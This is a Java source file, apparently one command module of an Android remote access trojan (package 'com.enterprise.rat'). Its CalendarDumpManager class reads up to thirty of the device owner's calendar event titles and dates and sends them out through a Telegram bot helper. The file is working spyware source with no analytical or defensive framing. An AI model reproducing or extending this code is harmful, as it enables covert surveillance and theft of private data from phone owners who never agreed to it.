package com.enterprise.rat.commands;

import android.content.Context;
import android.database.Cursor;
import android.provider.CalendarContract;
import com.enterprise.rat.utils.TelegramApi;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CalendarDumpManager {
    private Context context;
    public CalendarDumpManager(Context context) { this.context = context; }
    public void dumpCalendar() {
        StringBuilder sb = new StringBuilder("<b>📅 Calendar</b>\n\n");
        try {
            Cursor cursor = context.getContentResolver().query(CalendarContract.Events.CONTENT_URI, new String[]{"title","dtstart"}, null, null, "dtstart DESC LIMIT 30");
            if (cursor != null && cursor.moveToFirst()) {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd", Locale.US);
                do { sb.append("<b>").append(cursor.getString(0)).append("</b> - ").append(sdf.format(new Date(cursor.getLong(1)))).append("\n"); } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) { sb.append("Permission needed."); }
        TelegramApi.sendMessage(sb.toString());
    }
}
